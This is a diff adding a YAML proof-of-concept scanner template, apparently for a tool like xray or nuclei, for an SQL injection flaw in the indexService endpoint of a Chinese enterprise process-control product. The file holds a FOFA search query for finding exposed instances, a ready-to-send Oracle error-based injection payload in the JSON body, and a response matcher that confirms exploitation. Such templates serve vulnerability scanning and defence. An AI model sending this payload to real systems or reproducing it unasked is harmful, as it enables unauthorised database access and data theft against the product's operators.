@@ -1,0 +1,20 @@
+id: poc-yaml-skzy-epcs-indexservice-sqli
+info:
+  name: 时空智友企业流程化管控系统 indexService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 时空智友企业流程化管控系统
+  fofa: body="企业流程化管控系统"
+requests:
+- method: POST
+  path: /formservice?service=indexService.notice
+  headers:
+    Content-Type: application/json
+  data: '{"id":"1'' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT
+    (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))--
+    fKEk"}'
+  expression: status_code == 200 && contains(body,"qzpvq1qzvvq") && contains(body,"Oracle
+    Text 错误") && contains(body,"CTXSYS.DRUE") && contains(content_type,"text/xml")
+variables: {}
+transport: http
